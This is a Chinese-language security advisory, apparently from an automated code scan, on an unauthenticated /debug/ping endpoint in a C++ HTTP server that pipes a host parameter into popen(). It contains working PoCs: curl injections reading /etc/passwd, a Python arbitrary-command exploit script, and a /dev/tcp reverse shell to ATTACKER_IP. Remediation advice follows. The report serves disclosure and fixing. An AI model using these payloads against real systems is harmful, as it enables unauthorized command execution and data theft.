# VULN-SEC-CPP-AUTHZ-DIAG-001: POST /debug/ping 端点无认证且 host 参数直接拼接进入 popen 导致远程命令执行

**严重性**: Critical | **CWE**: CWE-306 (Missing Authentication for Critical Function) | **置信度**: 85/100
**位置**: `src/main.cpp:64-68` @ `main::lambda[/debug/ping]`
**语言/框架**: C++ / 自定义 HTTP 服务器
**分析类型**: authz (授权/认证缺陷)
**Source/Sink**: http_request → unauthenticated_endpoint
**规则/证据来源**: c_cpp.authz.missing_auth_on_critical_endpoint / llm

---

## 1. 漏洞细节

`POST /debug/ping` 端点是一个**完全无认证**的诊断接口，允许任何远程网络客户端通过 `host` 查询参数注入任意 shell 命令并在服务器上执行。

该漏洞由两个安全问题叠加构成：

1. **缺失认证（CWE-306）**: `/debug/ping` 路由处理器（handler）未执行任何认证或授权检查。对比同文件中 `POST /login`（第 40-52 行）显式调用了 `users.authenticate()` 进行凭证验证，而 `/debug/ping` 完全跳过了所有认证步骤。`HttpServer` 类（`http_server.hpp`）的公开接口仅有 `route()` 和 `run()` 两个方法，**不存在中间件（middleware）机制**，无法在请求分发前统一执行认证逻辑。

2. **命令注入（CWE-78）**: `Diagnostics::pingHost()` 将用户可控的 `host` 参数直接拼接到 shell 命令字符串 `"ping -c 1 " + host` 中，并通过 `popen()` 执行。`popen()` 内部调用 `/bin/sh -c` 解析命令，攻击者可通过 shell 元字符（`;`、`|`、`&&`、`` ` ``、`$()`）注入任意命令。

两个问题叠加使得**任何未经认证的远程攻击者**可在服务器上以进程运行权限执行任意操作系统命令，实现完整的远程代码执行（Remote Code Execution, RCE）。

### 证据摘要

- **触发源**: HTTP POST 请求的 `host` 查询参数（来自不可信网络）
- **危险点**: `popen(command.c_str(), "r")` — shell 命令执行（`src/diagnostics.cpp:12`）
- **已检查的清洗/缓解**: 无。无认证中间件、无 session 验证、无 token 检查、无 IP 白名单、无输入清洗
- **关键证据**:
  - `HttpServer` 类仅有 `route()` 和 `run()` 公开方法，无 middleware 支持（`include/http_server.hpp:21-35`）
  - 请求分发 `handler->second(request)` 无条件执行，无任何前置认证钩子（`src/http_server.cpp:127`）
  - 服务器绑定 `INADDR_ANY`（0.0.0.0），端口 8080，对所有网络接口可达（`src/http_server.cpp:92-93`）
  - 对比：`/login` 端点使用 `users.authenticate()` 进行认证（`src/main.cpp:45`），`/debug/ping` 无任何等价检查

## 2. 漏洞代码

### 漏洞入口 — 路由处理器

**文件**: `src/main.cpp` (行 64-68)

```cpp
server.route("POST", "/debug/ping", [&](const HttpRequest& request) {
    std::string host = queryValue(request, "host");   // ← 提取用户输入，无任何验证
    audit.event("operator", "debug-ping", host);       // ← 仅审计日志，非认证
    return text(200, diagnostics.pingHost(host));       // ← 直接传入危险函数
});
```

**逐行分析**：
- **第 65 行**: `queryValue(request, "host")` 从 HTTP 请求的查询参数中提取 `host` 值。该值完全由攻击者控制，无任何输入验证或清洗。
- **第 66 行**: `audit.event()` 仅记录审计日志，**不构成任何安全屏障**。日志记录不阻止请求处理。
- **第 67 行**: `diagnostics.pingHost(host)` 将未经验证的用户输入直接传递给执行 shell 命令的函数。

### 对比：有认证的 /login 端点

**文件**: `src/main.cpp` (行 40-52)

```cpp
server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");
    std::string password = queryValue(request, "password");
    audit.event(username, "login-attempt", request.body);

    if (!users.authenticate(username, password)) {     // ← 显式认证检查
      return text(401, "invalid credentials\n");
    }

    std::string token = users.issueSession(username);
    audit.event(username, "login-success", token);
    return text(200, "session=" + token + "\n");
});
```

`/login` 在处理业务逻辑前调用了 `users.authenticate()` 进行凭证验证。`/debug/ping` 缺少所有类似的认证步骤。

### 危险 Sink — Shell 命令执行

**文件**: `src/diagnostics.cpp` (行 7-22)

```cpp
std::string Diagnostics::pingHost(const std::string& host) const {
  std::string command = "ping -c 1 " + host;            // ← 字符串拼接，无输入清洗
  std::array<char, 256> buffer {};
  std::ostringstream output;

  FILE* pipe = popen(command.c_str(), "r");             // ← SHELL 命令执行（/bin/sh -c）
  if (!pipe) {
    return "failed to start diagnostic command\n";
  }

  while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
    output << buffer.data();
  }
  pclose(pipe);
  return output.str();
}
```

**关键问题**：
- **第 8 行**: `"ping -c 1 " + host` — 用户输入直接拼接到命令字符串。若 `host` 为 `; cat /etc/passwd`，则最终命令为 `ping -c 1 ; cat /etc/passwd`。
- **第 12 行**: `popen()` 内部通过 `/bin/sh -c` 执行命令，shell 会解析所有元字符。

### 无中间件的 HTTP 服务器

**文件**: `include/http_server.hpp` (行 21-35)

```cpp
class HttpServer {
 public:
  using Handler = std::function<HttpResponse(const HttpRequest&)>;

  explicit HttpServer(int port);
  void route(const std::string& method, const std::string& path, Handler handler);
  int run();

 private:
  int port_;
  std::map<std::string, Handler> handlers_;
  // ...
};
```

`HttpServer` 类**仅暴露三个公开方法**：构造函数、`route()`、`run()`。不存在 `use()`、`middleware()`、`before()`、`filter()` 等中间件注册接口。每个路由处理器必须自行实现认证逻辑。

### 无条件请求分发

**文件**: `src/http_server.cpp` (行 105-133)

```cpp
for (;;) {
    int client = accept(fd, nullptr, nullptr);           // ← 接受任意来源连接
    // ...
    HttpRequest request = parseRequest(std::string(buffer, static_cast<size_t>(n)));
    auto handler = handlers_.find(routeKey(request.method, request.path));

    HttpResponse response;
    if (handler == handlers_.end()) {
      response.status = 404;
      response.body = "not found\n";
    } else {
      response = handler->second(request);               // ← 无条件调用处理器，无前置认证
    }
    // ...
}
```

**第 127 行**: `handler->second(request)` 直接调用注册的处理器，没有任何前置认证、授权或速率限制检查。

**第 92 行**: `address.sin_addr.s_addr = INADDR_ANY` — 服务器绑定所有网络接口，任何可达该主机 8080 端口的网络客户端均可发起连接。

## 3. 完整攻击链路

```
[网络入口] HttpServer::run()@src/http_server.cpp:81
  绑定 INADDR_ANY:8080，accept() 接受任意来源 TCP 连接
↓ 接收 HTTP 请求数据，recv() 读取原始字节
[请求解析] HttpServer::parseRequest()@src/http_server.cpp:42
  解析 HTTP 方法、路径、查询参数、头部
↓ 生成 HttpRequest 对象，包含 query["host"] = 攻击者输入
[路由分发] HttpServer::run()@src/http_server.cpp:120-127
  handlers_.find("POST /debug/ping") → 找到处理器 → 无条件调用
↓ 无任何认证/授权前置检查
[漏洞入口] main::lambda[/debug/ping]@src/main.cpp:64
  处理器 lambda 开始执行
↓ 
[参数提取] queryValue(request, "host")@src/main.cpp:65
  从 request.query 中提取 "host" 参数值（攻击者完全可控）
↓ host = 攻击者注入的恶意字符串
[危险调用] diagnostics.pingHost(host)@src/main.cpp:67
  将未清洗的用户输入传入 Diagnostics 模块
↓ 
[命令拼接] "ping -c 1 " + host@src/diagnostics.cpp:8
  字符串拼接生成 shell 命令，无输入验证
↓ command = "ping -c 1 " + 恶意 payload
[命令执行] popen(command.c_str(), "r")@src/diagnostics.cpp:12
  通过 /bin/sh -c 执行拼接后的命令 → 远程代码执行 (RCE)
```

### 链路可达性验证

| 步骤 | 阻断可能性 | 验证结果 |
|------|-----------|---------|
| 网络连接 | 服务器绑定 INADDR_ANY:8080 | ✅ 任意网络客户端可达 |
| 请求分发 | `handlers_.find()` 无条件调用 | ✅ 无前置认证钩子 |
| 参数提取 | `queryValue()` 直接返回 query map 值 | ✅ 无输入验证 |
| 命令拼接 | 字符串 `+` 运算 | ✅ 无转义或过滤 |
| 命令执行 | `popen()` 调用 `/bin/sh` | ✅ shell 解析所有元字符 |

**结论**: 攻击链路从网络入口到 shell 命令执行全程无阻断，漏洞确认可利用。

## 4. 攻击场景

**攻击者画像**: 任何能够访问目标服务器 8080 端口的远程未认证用户。无需任何凭证、无需注册、无需特殊权限。攻击者只需知道服务器 IP 地址和端口即可发起攻击。

**攻击向量**: 通过 HTTP POST 请求向 `/debug/ping` 端点发送包含恶意 `host` 查询参数的请求。攻击可通过 `curl`、`wget`、Python 脚本或任何 HTTP 客户端工具发起。

**利用难度**: **低** — 无需绕过任何安全机制，无需特殊知识，仅需构造一个 HTTP 请求。

### 攻击步骤

1. **侦察**: 攻击者发现目标服务器开放 8080 端口（通过端口扫描或服务发现）
2. **探测**: 发送 `POST /debug/ping?host=127.0.0.1` 确认端点存在且可响应
3. **命令注入**: 构造恶意 `host` 参数，利用 shell 元字符注入任意命令：
   - 使用 `;` 分隔符：`host=127.0.0.1;id`
   - 使用管道符：`host=127.0.0.1|cat /etc/passwd`
   - 使用命令替换：`host=$(whoami)`
4. **执行**: 发送包含恶意 payload 的 HTTP 请求
5. **获取结果**: 服务器返回命令执行输出（HTTP 200 响应体中包含命令输出）

## 5. 攻击条件

| 条件类型 | 要求 | 说明 |
|----------|------|------|
| 网络可达性 | 需能访问目标 8080 端口 | 服务器绑定 `INADDR_ANY`（0.0.0.0:8080），对所有网络接口监听。若部署在公网或内网中无防火墙隔离，任何主机均可直接连接 |
| 认证要求 | **无需认证** | `/debug/ping` 端点无任何认证机制，不需要 session token、Authorization header 或任何凭证 |
| 配置依赖 | 无特殊配置要求 | 服务器默认启动即注册该路由，无需额外配置开启 |
| 环境依赖 | 系统需有 `ping` 命令和 `/bin/sh` | `popen()` 依赖 `/bin/sh` 执行命令。几乎所有 Linux/Unix 系统均满足此条件 |
| 时序条件 | 无 | 不存在竞态条件或时序依赖，单次请求即可触发 |

## 6. 造成影响

| 影响维度 | 等级 | 说明 |
|----------|------|------|
| 机密性 | **高** | 攻击者可读取服务器上的任意文件（如 `/etc/passwd`、`/etc/shadow`、应用配置文件、数据库凭证、私钥等），获取环境变量中的敏感信息 |
| 完整性 | **高** | 攻击者可修改、删除服务器上的文件，篡改应用数据，植入后门或恶意脚本，修改系统配置 |
| 可用性 | **高** | 攻击者可终止服务进程（`kill`）、删除关键文件、耗尽系统资源（fork bomb），导致服务完全不可用 |

**影响范围**: **全局** — 命令以运行服务器进程的系统用户权限执行。若服务以 root 身份运行（在某些容器化部署中常见），攻击者可获得完整的系统控制权。即使以普通用户运行，攻击者仍可：

- 读取该用户可访问的所有文件
- 利用该服务器作为跳板进行内网横向移动
- 建立反向 shell 实现持久化控制
- 窃取应用内存中的敏感数据（session token、API 密钥等）

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，未经授权对他人系统进行测试属于违法行为。

### PoC 1: 基础连通性验证（curl）

```bash
# 验证端点存在且可响应（无害测试）
curl -X POST "http://TARGET_IP:8080/debug/ping?host=127.0.0.1"
```

**预期结果**: 返回 HTTP 200，响应体包含 `ping` 命令的输出（如 `PING 127.0.0.1 ...`）。

### PoC 2: 命令注入验证 — 信息泄露（curl）

```bash
# 读取 /etc/passwd 文件
curl -X POST "http://TARGET_IP:8080/debug/ping?host=127.0.0.1%3Bcat%20/etc/passwd"

# 等效的未编码形式（在 shell 中需手动编码特殊字符）:
# host=127.0.0.1;cat /etc/passwd
```

**预期结果**: 返回 HTTP 200，响应体中先显示 ping 输出，随后显示 `/etc/passwd` 文件内容。

### PoC 3: 命令注入验证 — 身份确认（curl）

```bash
# 执行 id 命令确认当前用户身份
curl -X POST "http://TARGET_IP:8080/debug/ping?host=%24(id)"

# 等效形式: host=$(id)
```

**预期结果**: 返回 HTTP 200，响应体包含 `uid=XXX(username) gid=XXX(groupname)` 等信息。

### PoC 4: 自动化利用脚本（Python）

```python
#!/usr/bin/env python3
"""
VULN-SEC-CPP-AUTHZ-DIAG-001 PoC — 仅供安全测试使用
POST /debug/ping 无认证远程命令执行
"""
import sys
import urllib.request
import urllib.parse

def exploit(target_url, command):
    """通过 /debug/ping 端点执行任意命令"""
    # 构造恶意 host 参数：使用 ; 分隔符注入命令
    payload = f"127.0.0.1;{command}"
    encoded_payload = urllib.parse.quote(payload)
    
    url = f"{target_url}/debug/ping?host={encoded_payload}"
    
    req = urllib.request.Request(url, method="POST", data=b"")
    
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            result = resp.read().decode("utf-8", errors="replace")
            print(f"[+] 命令执行成功 (HTTP {resp.status})")
            print(f"[+] 输出:\n{result}")
            return result
    except Exception as e:
        print(f"[-] 请求失败: {e}")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <target_url> [command]")
        print(f"示例: {sys.argv[0]} http://192.168.1.100:8080 id")
        sys.exit(1)
    
    target = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
    
    print(f"[*] 目标: {target}")
    print(f"[*] 命令: {cmd}")
    print(f"[*] 端点: POST /debug/ping")
    print()
    
    exploit(target, cmd)
```

**使用说明**:

```bash
# 基础测试 — 确认命令执行
python3 poc.py http://TARGET_IP:8080 id

# 读取敏感文件
python3 poc.py http://TARGET_IP:8080 "cat /etc/passwd"

# 查看环境变量（可能包含密钥/token）
python3 poc.py http://TARGET_IP:8080 "env"

# 列出当前目录文件
python3 poc.py http://TARGET_IP:8080 "ls -la"
```

**预期结果**: 每次执行均返回 HTTP 200，响应体中包含注入命令的标准输出。

### PoC 5: 反向 Shell（高级利用 — 仅供渗透测试授权场景）

```bash
# 攻击者先启动监听
nc -lvnp 4444

# 通过 /debug/ping 触发反向 shell
curl -X POST "http://TARGET_IP:8080/debug/ping?host=127.0.0.1%3Bbash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261"
```

**预期结果**: 攻击者的 `nc` 监听端获得目标服务器的交互式 shell 会话。

## 8. 验证环境搭建

### 基础环境

- **操作系统**: Linux（Ubuntu 20.04+ / Debian 11+ / CentOS 8+，或任何支持 `ping` 命令的 Unix-like 系统）
- **编译器**: GCC 9+ 或 Clang 10+（需支持 C++17）
- **依赖**: `ping` 命令（通常包含在 `iputils-ping` 包中）、`/bin/sh`（标准 shell）

### 构建步骤

```bash
# 克隆/获取项目源码
cd /scan/project

# 编译项目（使用 C++17 标准）
g++ -std=c++17 -I include -o edge-gateway \
    src/main.cpp \
    src/http_server.cpp \
    src/diagnostics.cpp \
    src/user_store.cpp \
    src/file_cache.cpp \
    src/audit_log.cpp

# 或使用 CMake（如果项目提供 CMakeLists.txt）
mkdir build && cd build
cmake .. && make
```

### 运行配置

```bash
# 启动服务器（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

**注意**: 无需任何特殊配置即可触发漏洞。该端点在服务器启动时自动注册。

### 验证步骤

1. **启动目标服务器**:
   ```bash
   ./edge-gateway 8080
   ```

2. **验证端点可达**（无害测试）:
   ```bash
   curl -X POST "http://localhost:8080/debug/ping?host=127.0.0.1"
   ```
   预期：返回 HTTP 200，包含 ping 输出。

3. **验证命令注入**:
   ```bash
   curl -X POST "http://localhost:8080/debug/ping?host=127.0.0.1%3Bid"
   ```
   预期：返回中包含 `uid=` 信息，证明命令注入成功。

4. **验证文件读取**:
   ```bash
   curl -X POST "http://localhost:8080/debug/ping?host=127.0.0.1%3Bcat%20/etc/hostname"
   ```
   预期：返回中包含主机名。

5. **验证无认证要求**:
   ```bash
   # 不携带任何 Authorization header 或 session token
   curl -v -X POST "http://localhost:8080/debug/ping?host=127.0.0.1%3Bid"
   ```
   预期：即使不提供任何认证信息，仍返回 HTTP 200 和命令输出。

### 预期结果

- 所有请求均返回 **HTTP 200**，无需任何认证凭证
- 响应体中包含注入命令的标准输出
- `id` 命令返回当前进程的用户身份（如 `uid=1000(appuser) gid=1000(appuser)`）
- 若以 root 运行，`id` 将返回 `uid=0(root)`，表明攻击者拥有完整系统控制权

---

## 附录：修复建议

### 紧急缓解措施

1. **立即禁用或移除 `/debug/ping` 端点**，直到实施完整修复
2. 若必须保留诊断功能，添加 IP 白名单限制仅允许内网管理地址访问

### 根本修复方案

1. **实施认证中间件**: 为 `HttpServer` 类添加 middleware 机制，在请求分发前统一执行认证检查
2. **为敏感端点添加认证**: `/debug/ping` 应要求有效的管理员 session token 或 API 密钥
3. **修复命令注入**: 使用 `execve()` 或 `fork()/exec()` 替代 `popen()`，避免 shell 解析：
   ```cpp
   // 安全替代方案：使用 execvp 避免 shell 解析
   std::string Diagnostics::pingHost(const std::string& host) const {
     // 先验证 host 格式（仅允许 IP 地址或合法域名）
     if (!isValidHostname(host)) {
       return "invalid host\n";
     }
     // 使用 fork+exec 避免 shell 注入
     // ...
   }
   ```
4. **输入验证**: 对 `host` 参数实施严格的白名单验证（仅允许合法 IP 地址或域名格式）
5. **最小权限原则**: 确保服务器进程以最低权限用户运行，限制可执行的系统操作
